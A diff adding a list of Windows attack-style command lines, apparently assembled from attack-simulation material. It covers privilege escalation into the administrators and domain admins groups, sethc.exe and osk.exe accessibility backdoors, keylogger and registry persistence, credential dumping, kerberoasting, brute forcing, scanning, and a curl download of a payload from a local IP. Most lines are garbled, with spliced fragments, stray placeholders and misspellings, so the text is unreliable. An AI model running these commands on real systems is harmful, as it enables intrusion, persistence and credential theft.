@@ -1,0 +1,64 @@
+set windir= $ { parent_pid } '
+ffuf -w $ consumerargs
+namp -sn $ shadow shadow \system32\osk.exe
+attrib +h $ filterargs
+net localgroup administrators `` cor_profiler
+namp -sn -l $ { copy volumn name you target = `` keylog
+nmap -o ;
+rundll32 -name `` security /v # { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+gobuster vhost -u $ { -p $ profile
+adfind.exe .. exe unload kerberoast `` $ : '' { \users\ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins = `` $ { filename_regex }
+iediagcmd.exe -o `` $ bits_job_name } binpath=
+set keylogger_dll_invisible.dll -new hkey_local_machine\software\microsoft\windows \\ ) $ { remote_host }
+net localgroup
+namp -sn $ domain
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+copy-item `` file_name } /user `` bits_job_name } binpath= `` administrators }
+net localgroup administrators `` @ : cor_profiler ;
+reg `` hkey_current_user\control panel\desktop '' -name `` \windows\system32\sethc.exe
+quser
+cscript $ { domain admins '' `` @ `` keylog
+net localgroup administrators `` cor_enable_profiling
+rundll32 -executionpolicy -command `` '' $ `` hklm\software\microsoft\active setup\installed components\atomic_test '' '' ; querylanguage= \windows\system32\sethc_backup.exe
+reg add `` shell.createshortcut : `` hklm\software\microsoft\windows dump_file : $ : \windows\system32\ $ { file_name }
+cmdkey /list
+net localgroup administrators
+net localgroup `` consumer=set-wmiinstance
+net localgroup administrators `` @ 5
+icacls % \system32\osk.exe
+net localgroup administrators administrators /add
+copy `` localaccount=true $ { target % `` $ { output_zip_name } /user : $ { filename_regex }
+namp -sn $ { filename_regex }
+copy rundll32.exe c : `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+bitsadmin.exe /create /add
+net user administrator @ `` '' t1547.009 /user : @ ( `` set-wmiinstance file set-wmiinstance -namespace -name new-object -comobject ) manager\environment ;
+.\hydra -l @ `` $ target = `` $ ( = set-wmiinstance file set-wmiinstance you shell.createshortcut ( `` http : \system\currentcontrolset\services\winsock2\parameters -name atomic_red_team /d 1 ;
+net shortcut = `` keylog
+net localgroup administrators
+icacls % windir % \system32\osk.exe /grant administrators administrators
+rubeus.exe -t $ consumerargs = @ `` domain admins `` $ wscriptshell.createshortcut host : cor_profiler
+set-executionpolicy -executionpolicy windir=
+net stop
+vsiisexelauncher.exe -p $ { output_zip } /user true
+net localgroup administrators `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } in administrators '' t1547.009 in `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ) t1547.009 t1547.009 . `` commandline
+tasklist
+net group `` domain admins $ `` domain admins '' `` $ `` host `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /f
+iediagcmd.exe /out $ { nt\currentversion\windows '' -name `` '' '' `` autorun $ { filename_regex }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` enabled `` appinit_dlls '' /f
+for : \windows\system32\at.exe $ { filename_regex
+gobuster dir -u $ { volumn -b = administrators } /user : set-wmiinstance administrators
+net group `` localaccount=true /user : cor_profiler -name administrators ''
+net localgroup -l administrators `` @ `` $ { filename_regex }
+quser
+tasklist
+net localgroup administrators `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 wevtutil reg_dword /v `` cor_profiler = debugger
+namp -sn $ domain
+net localgroup administrators `` @ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 command= `` $ { target $ { filename_regex )
+namp -sn -l $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins -name `` $ { filename_regex }
+hydra -l $ `` 7 :minidump = http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net group `` domain admins `` @ `` '' `` cor_enable_profiling -name `` cor_profiler -name `` '' '' threadingmodel ''
+rdrleakdiag.exe /p % :logonpasswords
+net localgroup administrators
+ffuf -w $ consumerargs
+net localgroup administrators `` administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -p = `` $ { filename_regex }
+nmap -o $ { filename_regex }
